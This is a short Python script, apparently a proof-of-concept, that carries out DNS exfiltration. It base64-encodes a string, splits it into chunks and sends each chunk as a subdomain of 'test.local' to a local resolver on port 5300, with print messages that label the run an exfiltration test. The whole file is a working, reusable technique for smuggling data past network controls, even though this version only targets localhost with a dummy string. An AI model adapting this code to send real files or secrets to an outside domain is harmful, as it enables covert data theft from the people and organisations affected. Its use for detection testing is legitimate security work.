#!/usr/bin/env python3
import dns.resolver
import base64
import time

def encode_data(data):
    """Encode data into base64 and split into chunks"""
    encoded = base64.b64encode(data.encode()).decode().rstrip('=')
    return [encoded[i:i+60] for i in range(0, len(encoded), 60)]

def exfiltrate_data(data):
    """Send data through DNS queries"""
    chunks = encode_data(data)
    resolver = dns.resolver.Resolver()
    resolver.nameservers = ['127.0.0.1']
    resolver.port = 5300
    
    for i, chunk in enumerate(chunks):
        query = f"{chunk}.test.local"
        try:
            resolver.resolve(query, 'A')
            print(f"Sent chunk {i+1}/{len(chunks)}: {chunk}")
            time.sleep(0.1)
        except Exception as e:
            print(f"Error sending chunk {i+1}: {e}")

if __name__ == '__main__':
    test_data = "anonstwashere"
    print(f"Starting DNS exfiltration test...")
    exfiltrate_data(test_data)
    print("Test complete!") 